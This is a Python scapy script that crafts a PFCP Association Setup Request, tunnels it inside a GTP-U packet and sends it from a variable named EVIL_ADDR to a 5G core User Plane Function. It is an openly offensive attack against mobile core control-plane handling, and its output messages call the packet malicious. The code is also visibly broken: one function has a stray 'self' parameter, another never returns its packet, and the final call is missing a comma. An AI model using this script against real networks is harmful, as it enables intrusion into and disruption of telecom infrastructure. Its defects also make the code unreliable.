from scapy.all import *
from scapy.contrib.gtp import *
from scapy.contrib.pfcp import *
import sys
import random
import time

UPF_ADDR = "10.100.200.2"
EVIL_ADDR = "10.100.200.66"


seq = 1


def new_seq(rand=False):
    global seq
    if rand:
        seq = random.randint(0, 0xFFFF)
    else:
        seq += 1
    return seq


def build_PFCP_association_setup_req(self, src_addr, dest_addr, src_port, dest_port):
    global seq

    seq = new_seq(True)

    # Trick to bypass scapy's bad parsing
    node_id = Raw(bytes(IE_NodeId(id_type=0, ipv4=src_addr)))
    recovery_timestamp = Raw(bytes(IE_RecoveryTimeStamp(timestamp=int(time.time()))))
    pfcp_msg = (
        PFCP(version=1, message_type=5, seid=0, S=0, seq=seq)
        / node_id
        / recovery_timestamp
    )

    packet = (
        IP(src=src_addr, dst=dest_addr)
        / UDP(sport=src_port, dport=dest_port)
        / pfcp_msg
    )
    packet = packet.__class__(bytes(packet))
    return packet


def build_malicious_pfcp_in_gtp_packet(
    src_addr,
    dest_addr,
    teid,
    gtpu_src_port=RandShort(),
    gtpu_dest_port=2152,
    pfcp_src_port=RandShort(),
    pfcp_dest_port=8805,
):
    pfcp_packet = build_PFCP_association_setup_req(
        src_addr=src_addr,
        dest_addr=dest_addr,
        src_port=pfcp_src_port,
        dest_port=pfcp_dest_port,
    )

    gtp_packet = (
        IP(src=src_addr, dst=dest_addr)
        / UDP(sport=gtpu_src_port, dport=gtpu_dest_port)
        / GTP_U_Header(teid=teid)
        / pfcp_packet
    )


def send_malicious_pfcp_in_gtp_packet(
    src_addr,
    dest_addr,
    teid,
):
    """Sending a PFCP packet through user plane GTP tunnel to the UPF
    Args:
        src_addr (str): Source IP for outer (GTP-U) and inner (PFCP) IP layers.
        dest_addr (str): Destination IP for outer (GTP-U) and inner (PFCP) IP layers.
        src_port (int): Source port for the inner UDP layer (encapsulating PFCP).
        dest_port (int): Destination port for the inner UDP layer (encapsulating PFCP, default: random).
        teid (int): GTP-U Tunnel Endpoint Identifier.

    """

    packet = build_malicious_pfcp_in_gtp_packet(
        src_addr=src_addr,
        dest_addr=dest_addr,
        teid=teid,
    )

    packet.show()

    print(
        f"[$]  Sending malicious PFCP packet in GTP tunnel to {dest_addr} with TEID {teid}"
    )
    send(packet)
    print(f"[+]  Packet sent successfully")


send_malicious_pfcp_in_gtp_packet(
    src_addr=EVIL_ADDR
    dest_addr=UPF_ADDR,
    teid=sys.argv[1],
)
